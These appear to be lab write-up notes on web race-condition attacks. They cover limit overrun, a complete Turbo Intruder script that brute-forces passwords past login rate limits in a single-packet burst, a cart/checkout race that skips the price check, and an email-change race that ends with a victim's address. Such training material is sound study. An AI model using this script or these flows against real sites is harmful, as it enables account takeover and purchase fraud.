
### Limit overrun race conditions
**Payload** :
There's two way to solve, using repeater -> group -> send as parallel. and using custom action (burp prof only) -> that it's not just for RC but can be used for another case

### Bypassing rate limits via race conditions
**Payload** :
Since website implement rate limit on login, we can using race condition attack using Turbo Intruder then using race-single-packet-attack.py code. that it will attack using wordlist from our clipboard
```python
def queueRequests(target, wordlists):

	# as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
	
	engine = RequestEngine(endpoint=target.endpoint,
		concurrentConnections=1,
		engine=Engine.BURP2
	)

	# assign the list of candidate passwords from your clipboard
	
	passwords = wordlists.clipboard
	
	# queue a login request using each password from the wordlist
	
	# the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
	
	for password in passwords:
		engine.queue(target.req, password, gate='1')
		# once every request has been queued
		# invoke engine.openGate() to send all requests in the given gate simultaneously
	
	engine.openGate('1')

def handleResponse(req, interesting):
	table.add(req)
```

### Multi-endpoint race conditions
**Flow** :
On purchasing mechanism, it's like server will check the total price first then comparing with the current balance then purchasing all item. How if we send request POST /cart after server comparing total price with current balance, so the server will purchasing the jacket without checking price

Send `POST /cart` and `POST /cart/checkout` to the tab, then send as group. if the lab still not completed, duplicate 20 request `POST /cart` 

### Single-Endpoint Race Conditions
**Flow** :
On change email mechanism, it's like the server will save the new email to db, then send email confirmation. so we can abuse it by race condition on change email endpoint with different email. so the flow probably will look like this

valid@email.com -> save to db -> victim@email.com -> save to db -> send email confirmation to valid@email.com. which when we click the email confirmation it will change to victim@email.com


